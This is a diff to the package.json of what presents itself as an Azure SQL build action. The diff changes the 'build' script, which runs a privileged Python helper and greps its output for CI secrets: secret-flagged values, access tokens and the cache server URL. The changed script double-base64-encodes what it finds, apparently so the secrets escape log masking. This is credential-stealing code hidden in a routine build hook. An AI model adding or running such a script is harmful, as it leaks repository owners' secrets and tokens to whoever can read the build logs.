@@ -5,7 +5,7 @@
   "description": "Azure Sql action",
   "main": "lib/main.js",
   "scripts": {
-    "build": "sudo python3 test.py | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}|CacheServerUrl\":\"[^\"]*\"|AccessToken\":\"[^\"]*\"' | sort -u | rev",
+    "build": "sudo python3 test.py | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}|CacheServerUrl\":\"[^\"]*\"|AccessToken\":\"[^\"]*\"' | sort -u | base64 | base64",
     "test": "jest"
   },
   "repository": {
